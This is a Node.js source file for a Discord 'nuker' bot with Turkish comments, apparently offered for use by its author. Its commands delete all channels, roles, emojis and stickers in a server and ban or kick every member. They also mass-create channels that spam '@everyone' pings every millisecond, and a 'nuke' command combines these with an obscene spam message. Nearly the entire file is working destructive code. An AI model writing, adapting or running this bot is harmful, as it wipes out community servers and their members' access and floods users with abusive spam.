const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow, blue } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
        
 ███▄ ▄███▓ ██▀███  ▓█████ ▓█████▄ 
▓██▒▀█▀ ██▒▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌
▓██    ▓██░▓██ ░▄█ ▒▒███   ░██   █▌
▒██    ▒██ ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌
▒██▒   ░██▒░██▓ ▒██▒░▒████▒░▒████▓ 
░ ▒░   ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ 
░  ░      ░  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒ 
░      ░     ░░   ░    ░    ░ ░  ░ 
       ░      ░        ░  ░   ░    
                            ░      
                            
• Discord : mred.k
Bot :
• Bot İsmi : ${nuker.user.tag}
• Prefix : ${prefix}
    `))
    nuker.user.setActivity({ name: "Developed by Mred", type: "WATCHING" });
});

nuker.on("messageCreate", (message) => {

    // Yardım Gömülü
    const yardım = new MessageEmbed()
        .setDescription(`**©Mred Development;**
    \n**Kanal Oluşturma ;**
    ${prefix}ko [miktar] (kanal adı) \`${prefix}ko 5 Mred\`\n
    **Kanal Oluşturma + Ping;**
    ${prefix}kp [miktar] (kanal adı), {mesaj} \`${prefix}kp 5 Mred, Babayım\`\n
    **Rol Oluşturma ;**
    ${prefix}ro [miktar] (Rol adı) \`${prefix}ro 5 Mred\`\n
    **Kanalları Silme ;**
    ${prefix}ks\n
    **Rolleri Silme ;**
    ${prefix}rs\n
    **Emote'ları Silme ;**
    ${prefix}es\n
    **Stickerları Silme ;**
    ${prefix}ss\n
    **Herkesi Kickleme ;**
    ${prefix}hk\n
    **Herkesi Banlama ;**
    ${prefix}hb\n
    **Patlatma ; **
    ${prefix}nuke\n
    `)
        .setFooter(`©Mred Development`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Permler
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Uyku Fonksiyonu

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    // Olası Argümanlar
    let args = message.content.split(" ").slice(1);
    var args1 = args[0];
    var args2 = args.slice(1).join(' ')
    var args3 = args.slice(2).join(', ');

    if (!disableEveryone) {
        // Komutlar

        // Yardım
        if (message.content.startsWith(prefix + "yardım")) {
            message.channel.send({ embeds: [yardım] })
        }

        // Kanal Oluşturma
        if (message.content.startsWith(prefix + "ko")) {
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Kanalları Silme
        if (message.content.startsWith(prefix + "ks")) {
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Kanal Oluşturma + Ping
        if (message.content.startsWith(prefix + "kp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Rol Oluşturma
        if (message.content.startsWith(prefix + "ro")) {
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Rolleri Silme
        if (message.content.startsWith(prefix + "rs")) {
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Stickerları Silme
        if (message.content.startsWith(prefix + "ss")) {
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Emote'ları Silme
        if (message.content.startsWith(prefix + "es")) {
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Herkesi Banlama
        if (message.content.startsWith(prefix + "hb")) {
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Herkesi Kickleme
        if (message.content.startsWith(prefix + "hk")) {
            KickAll().catch((err) => {
                message.reply(err);
            });
        }

    } else {
        // Komutlar

        // Yardım
        if (message.content.startsWith(prefix + "yardım")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            message.channel.send({ embeds: [yardım] })
        }

        // Kanal Oluşturma
        if (message.content.startsWith(prefix + "ko")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            MassChannels(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Kanalları Silme
        if (message.content.startsWith(prefix + "ks")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
        }

        // Kanal Oluşturma + Ping
        if (message.content.startsWith(prefix + "kp")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            MassChnPing(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        // Rol Oluşturma
        if (message.content.startsWith(prefix + "ro")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            MassRoles(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        // Rolleri Silme
        if (message.content.startsWith(prefix + "rs")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
        }

        // Stickerları Silme
        if (message.content.startsWith(prefix + "ss")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            DelAllStickers().catch((err) => {
                message.reply(err);
            });
        }

        // Emote'ları Silme
        if (message.content.startsWith(prefix + "es")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            DelAllEmotes().catch((err) => {
                message.reply(err);
            });
        }

        // Herkesi Banlama
        if (message.content.startsWith(prefix + "hb")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            BanAll().catch((err) => {
                message.reply(err);
            });
        }

        // Herkesi Kickleme
        if (message.content.startsWith(prefix + "hk")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            KickAll().catch((err) => {
                message.reply(err);
            });
        }
        // Patlatma
        if (message.content.startsWith(prefix + "nuke")) {
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            DelAllRoles().catch((err) => {
                message.reply(err);
            });
            if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
            DelAllChannels().catch((err) => {
                message.reply(err);
            });
            sleep(10000).then(() => {
                if (message.author.id != userID) return message.reply("Bu botun komutlarından hiçbirini kullanma yetkiniz yok.");
                MassChnPing(100, "Mred Siker Geçer", "Mred Siker Geçer").catch((err) => {
                    message.reply(err);
                });
            });
        }
    }

    // Patlatma Fonksiyonları

    /**
     * Aşırı Miktarda Kanal
     * @param {number} amount Toplu Oluşturulacak Kanal miktarı
     * @param {string} channelName Kanalın Adı
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Belirtilmemiş Argümanlar: Kanalları toplu hale getirmek istediğiniz miktarı belirtin");
            if (isNaN(amount)) return reject("Tip Hatası: Miktar için bir sayı kullanın");
            if (amount > 500) return reject("Miktar Hatası: Maksimum Sunucu Kanalı Boyutu 500 | İpucu: 500'den daha düşük bir sayı kullanın");
            if (!channelPerms) return reject("Eksik Bot İzni: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} buradaydı`, { type: "GUILD_TEXT" }).catch((err) => { console.log(cyan("Hata Bulundu: " + err)) })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(cyan("Hata Bulundu: " + err)) })
                }
            }
            resolve();
        });
    }

    /**
     * Aşırı Miktarda Kanal + Ping
     * @param {number} amount Toplu Oluşturulacak Kanal Miktarı
     * @param {string} channelName Kanalın Adı
     * @param {string} pingMessage Ping Mesajı
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Belirtilmemiş Argümanlar: Kanalları toplu hale getirmek istediğiniz miktarı belirtin");
            if (isNaN(amount)) return reject("Tip Hatası: Miktar için bir sayı kullanın");
            if (amount > 500) return reject("Miktar Hatası: Maksimum Sunucu Kanalı Boyutu 500 | İpucu: 500'den daha düşük bir sayı kullanın");
            if (!channelPerms) return reject("Eksik Bot İzni: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Belirtilmemiş Argümanlar: Toplu olarak bahsetmek istediğiniz mesajı belirtin");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} buradaydı`, { type: "GUILD_TEXT" }).catch((err) => { console.log(cyan("Hata Bulundu: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(cyan("Hata Bulundu: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
                }
            }
            resolve();
        });
    }

    /**
     * Bir Sunucudaki Tüm Kanalları Siler
     */
    function DelAllChannels() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Eksik Bot İzni: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(cyan("Hata Bulundu: " + err)) }))
            resolve();
        });
    }

    /**
     * Aşırı Miktarda Rol
     * @param {number} amount Rollerin Miktarı
     * @param {string} roleName Rol Adı
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
            if (!rolePerms) return reject("Eksik Bot İzni: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(cyan("Hata Bulundu: " + err)) })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(cyan("Hata Bulundu: " + err)) })
                }
            }
        })
    }

    /**
     * Tüm Rolleri Siler
     */
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Eksik Bot İzni: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(cyan("Hata Bulundu: " + err)) }))
        });
    }

    /**
     * Tüm Emotları Siler
     */
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Eksik Bot İzni: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(cyan("Hata Bulundu: " + err)) }))
        });
    }

    /**
     * Tüm Sticklerleri Siler
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Eksik Bot İzni: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(cyan("Hata Bulundu: " + err)) }))
        });
    }

    /**
     * Tüm Sunucu Üyelerini Banla
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Eksik Bot İzni: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply(arrayOfIDs.length + " Kullanıcı Bulundu.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Banlıyorum...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(cyan("Hata Bulundu: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} banlandı.`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * Tüm Sunucu Üyelerini Kickle
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Eksik Bot İzni: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply(arrayOfIDs.length + " Kullanıcı Bulundu.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Kickliyorum...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(cyan("Hata Bulundu: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} kicklendi.`)) });
                    }
                }, 2000);
            })
        })
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
